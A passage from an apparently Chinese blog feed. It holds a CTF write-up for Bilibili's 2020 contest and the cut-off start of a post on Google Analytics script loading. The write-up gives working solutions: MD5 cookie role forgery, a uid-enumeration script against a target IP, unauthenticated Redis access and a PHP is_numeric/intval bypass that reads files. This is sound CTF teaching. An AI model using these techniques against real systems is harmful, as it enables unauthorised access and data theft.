09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span 